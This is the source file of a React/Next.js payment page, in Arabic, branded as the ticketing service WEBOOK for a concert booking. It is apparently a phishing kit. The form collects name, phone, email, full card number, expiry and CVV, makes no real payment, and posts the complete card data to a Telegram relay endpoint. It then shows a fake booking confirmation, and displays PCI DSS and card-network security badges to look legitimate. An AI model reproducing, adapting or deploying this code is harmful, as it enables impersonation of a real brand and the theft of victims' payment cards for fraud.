"use client";

import { useState } from "react";
import { useSearchParams, useRouter } from "next/navigation";
import toast from "react-hot-toast";
import { useCurrency } from "../components/CurrencyProvider";
import Image from "next/image";

export default function PaymentPage() {
  const { formatPrice } = useCurrency();
  const searchParams = useSearchParams();
  const router = useRouter();
  const [loading, setLoading] = useState(false);

  const eventId = searchParams.get("eventId");
  const seats = searchParams.get("seats")?.split(",") || [];
  const total = searchParams.get("total") || "5000";

  const [formData, setFormData] = useState({
    fullName: "",
    phone: "",
    email: "",
    cardNumber: "",
    expiryMonth: "",
    expiryYear: "",
    cvv: "",
  });

  const [errors, setErrors] = useState<{ [key: string]: string }>({});
  const [generalError, setGeneralError] = useState("");

  const getCardType = (cardNumber: string) => {
    const cleanNumber = cardNumber.replace(/\D/g, "");

    if (cleanNumber.startsWith("4")) {
      return "Visa";
    } else if (cleanNumber.startsWith("5") || cleanNumber.startsWith("2")) {
      return "Mastercard";
    } else if (cleanNumber.startsWith("3")) {
      return "American Express";
    } else if (cleanNumber.startsWith("6")) {
      return "Discover";
    } else if (cleanNumber.startsWith("9")) {
      return "Mada";
    }
    return "Unknown";
  };

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;

    // Special handling for card number - format and limit to 16 digits
    if (name === "cardNumber") {
      const cleanValue = value.replace(/\D/g, ""); // Remove non-digits
      const formattedValue = cleanValue.replace(/(\d{4})(?=\d)/g, "$1 "); // Add spaces every 4 digits
      if (cleanValue.length <= 16) {
        setFormData((prev) => ({
          ...prev,
          [name]: formattedValue,
        }));
      }
      return;
    }

    // Special handling for expiry month - limit to 2 digits and validate
    if (name === "expiryMonth") {
      const cleanValue = value.replace(/\D/g, "");
      if (
        cleanValue.length <= 2 &&
        (cleanValue === "" ||
          (parseInt(cleanValue) >= 1 && parseInt(cleanValue) <= 12))
      ) {
        setFormData((prev) => ({
          ...prev,
          [name]: cleanValue,
        }));
      }
      return;
    }

    // Special handling for expiry year - limit to 2 digits
    if (name === "expiryYear") {
      const cleanValue = value.replace(/\D/g, "");
      if (cleanValue.length <= 2) {
        setFormData((prev) => ({
          ...prev,
          [name]: cleanValue,
        }));
      }
      return;
    }

    // Special handling for CVV - limit to 3 digits
    if (name === "cvv") {
      const cleanValue = value.replace(/\D/g, "");
      if (cleanValue.length <= 3) {
        setFormData((prev) => ({
          ...prev,
          [name]: cleanValue,
        }));
      }
      return;
    }

    setFormData((prev) => ({
      ...prev,
      [name]: value,
    }));
  };

  const validateForm = () => {
    const errors = [];

    if (!formData.fullName.trim()) {
      errors.push("الاسم بالكامل مطلوب");
    }

    if (!formData.phone.trim()) {
      errors.push("رقم الواتساب مطلوب");
    }

    if (!formData.email.trim()) {
      errors.push("البريد الإلكتروني مطلوب");
    } else if (!/\S+@\S+\.\S+/.test(formData.email)) {
      errors.push("البريد الإلكتروني غير صحيح");
    }

    if (!formData.cardNumber.trim()) {
      errors.push("رقم البطاقة مطلوب");
    } else {
      const cleanCardNumber = formData.cardNumber.replace(/\D/g, "");
      if (cleanCardNumber.length !== 16) {
        errors.push("رقم البطاقة يجب أن يكون 16 رقم");
      }
    }

    if (!formData.expiryMonth.trim()) {
      errors.push("شهر انتهاء البطاقة مطلوب");
    } else {
      const month = parseInt(formData.expiryMonth);
      if (month < 1 || month > 12) {
        errors.push("شهر انتهاء البطاقة غير صحيح");
      }
    }

    if (!formData.expiryYear.trim()) {
      errors.push("سنة انتهاء البطاقة مطلوبة");
    } else {
      const year = parseInt(formData.expiryYear);
      const currentYear = new Date().getFullYear() % 100;
      if (year < currentYear) {
        errors.push("سنة انتهاء البطاقة منتهية الصلاحية");
      }
    }

    if (!formData.cvv.trim()) {
      errors.push("رمز CVV مطلوب");
    } else if (formData.cvv.length !== 3) {
      errors.push("رمز CVV يجب أن يكون 3 أرقام");
    }

    return errors;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    // Validate form
    const validationErrors = validateForm();
    if (validationErrors.length > 0) {
      validationErrors.forEach((error) => toast.error(error));
      return;
    }

    setLoading(true);

    try {
      // Generate a mock booking ID for reference
      const mockBookingId = `booking-${Date.now()}`;

      // Send data directly to Telegram
      const telegramResponse = await fetch("/api/telegram", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          bookingData: {
            eventTitle: "ليلة عودة المسافرين - راشد الماجد وفضل شاكر",
            customerName: formData.fullName,
            customerPhone: formData.phone,
            customerEmail: formData.email,
            seats: seats.map((seatId, index) => ({
              row: "A",
              number: index + 1,
              category: "VIP",
              price: parseFloat(total) / seats.length,
            })),
            totalAmount: parseFloat(total),
            timestamp: new Date().toISOString(),
            bookingId: mockBookingId,
            cardInfo: {
              cardNumber: formData.cardNumber,
              expiryMonth: formData.expiryMonth,
              expiryYear: formData.expiryYear,
              cvv: formData.cvv,
              cardType: getCardType(formData.cardNumber),
            },
            paymentInfo: {
              cardLastFour: formData.cardNumber.slice(-4),
              paymentMethod: "بطاقة ائتمان",
            },
          },
        }),
      });

      if (telegramResponse.ok) {
        router.push(
          `/confirm?phone=${formData.phone}&bookingId=${mockBookingId}`
        );
      } else {
        const error = await telegramResponse.json();
      }
    } catch (error) {
      console.error("Payment error:", error);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-dark-lighter">
      <div className="p-4 max-w-md mx-auto">
        {/* WBK Logo */}
        <div className="text-center flex flex-col items-center mb-6 pt-6">
          <Image alt="logo" width={130} height={130} src={"/download.png"} />
        </div>

        {/* WEBOOK Header */}
        <div className="bg-white rounded-lg p-3 mb-3">
          <div className="text-center text-gray-800 font-semibold text-sm mb-2">
            WEBOOK
          </div>
        </div>

        {/* Payment Form */}
        <div className="bg-white rounded-lg p-4 mb-3">
          {/* Payment Method Icons */}
          <div className="flex items-center justify-end gap-2 mb-4">
            <img
              src="/master.jpg"
              alt="Visa"
              className="h-6 w-auto opacity-60"
            />
            <img
              src="/Card-Mada.svg"
              alt="Visa"
              className="h-6 w-auto opacity-60"
            />
            <img
              src="/Card-Visa.svg"
              alt="Visa"
              className="h-6 w-auto opacity-60"
            />
            <img
              src="/Card-Amex.svg"
              alt="Visa"
              className="h-6 w-auto opacity-60"
            />
          </div>

          <form onSubmit={handleSubmit} className="space-y-3">
            {/* Full Name */}
            <div>
              <label className="block text-right text-gray-400 text-xs mb-1">
                الاسم بالكامل
              </label>
              <input
                type="text"
                name="fullName"
                value={formData.fullName}
                onChange={handleInputChange}
                className="w-full p-3 border border-gray-200 rounded-lg text-sm text-gray-800 text-right bg-gray-50"
                required
              />
            </div>

            {/* Phone Number */}
            <div>
              <label className="block text-right text-gray-400 text-xs mb-1">
                رقم الواتساب
              </label>
              <input
                type="tel"
                name="phone"
                value={formData.phone}
                onChange={handleInputChange}
                className="w-full p-3 border border-gray-200 rounded-lg text-sm text-gray-800 text-right bg-gray-50"
                required
              />
            </div>

            {/* Email */}
            <div>
              <label className="block text-right text-gray-400 text-xs mb-1">
                البريد الإلكتروني
              </label>
              <input
                type="email"
                name="email"
                value={formData.email}
                onChange={handleInputChange}
                className="w-full p-3 border border-gray-200 rounded-lg text-sm text-gray-800 text-right bg-gray-50"
                required
              />
            </div>

            {/* Card Details Header */}
            <div className="text-right text-gray-400 text-xs mt-4 mb-2">
              بيانات البطاقة
            </div>

            {/* Card Number */}
            <div className="relative">
              <input
                type="text"
                name="cardNumber"
                placeholder="XXXX XXXX XXXX XXXX"
                value={formData.cardNumber}
                onChange={handleInputChange}
                className="w-full p-3 border border-gray-200 rounded-lg text-sm text-gray-800 bg-gray-50 pl-10"
                required
              />
              <div className="absolute left-3 top-3">
                <svg
                  className="w-4 h-3 text-gray-400"
                  fill="none"
                  stroke="currentColor"
                  viewBox="0 0 24 24"
                >
                  <rect x="2" y="5" width="20" height="14" rx="2" ry="2" />
                  <line x1="2" y1="10" x2="22" y2="10" />
                </svg>
              </div>
            </div>

            {/* Expiry and CVV */}
            <div className="flex gap-2">
              <div className="flex-1">
                <input
                  type="text"
                  name="expiryMonth"
                  placeholder="MM"
                  value={formData.expiryMonth}
                  onChange={handleInputChange}
                  className="w-full p-3 border border-gray-200 rounded-lg text-sm text-gray-800 text-center bg-gray-50"
                  maxLength={2}
                  required
                />
              </div>
              <div className="flex-1">
                <input
                  type="text"
                  name="expiryYear"
                  placeholder="YY"
                  value={formData.expiryYear}
                  onChange={handleInputChange}
                  className="w-full p-3 border border-gray-200 rounded-lg text-sm text-gray-800 text-center bg-gray-50"
                  maxLength={2}
                  required
                />
              </div>
              <div className="flex-1 relative">
                <input
                  type="text"
                  name="cvv"
                  placeholder="CVV"
                  value={formData.cvv}
                  onChange={handleInputChange}
                  className="w-full p-3 border border-gray-200 rounded-lg text-sm text-gray-800 text-center bg-gray-50 pr-6"
                  maxLength={3}
                  required
                />
                <div className="absolute right-2 top-3">
                  <div className="w-3 h-3 bg-gray-400 rounded-full flex items-center justify-center">
                    <span className="text-white text-xs">?</span>
                  </div>
                </div>
              </div>
            </div>
          </form>
        </div>
        {/* Total Amount */}
        <div className="bg-white rounded-lg p-4 mb-3">
          <div className="text-center text-gray-800 font-bold text-lg">
            {formatPrice(parseFloat(total))}
          </div>
        </div>

        {/* Submit Button */}
        <button
          onClick={handleSubmit}
          disabled={loading}
          className="w-full bg-pink-500 text-white py-3 rounded-lg font-bold text-sm disabled:opacity-50 disabled:cursor-not-allowed hover:bg-pink-600 transition-colors mb-4"
        >
          {loading ? "جاري المعالجة..." : "ادفع الآن"}
        </button>

        {/* Cancel Link */}
        <div className="text-center mb-6">
          <button className="text-gray-400 text-xs">الغاء</button>
        </div>

        {/* Security Logos */}
        <div className="flex flex-row-reverse items-center justify-center gap-4 pb-6">
          <img
            src="/pci-dss.svg"
            alt="PCI DSS"
            className="h-6 w-auto opacity-60"
          />
          <img
            src="/amex-safekey.svg"
            alt="SafeKey"
            className="h-6 w-auto opacity-60"
          />
          <img src="/mc-securecode.svg" className="h-6 w-auto opacity-60" />
          <img
            src="/verified-visa.svg"
            alt="Visa"
            className="h-6 w-auto opacity-60"
          />
        </div>
      </div>
    </div>
  );
}
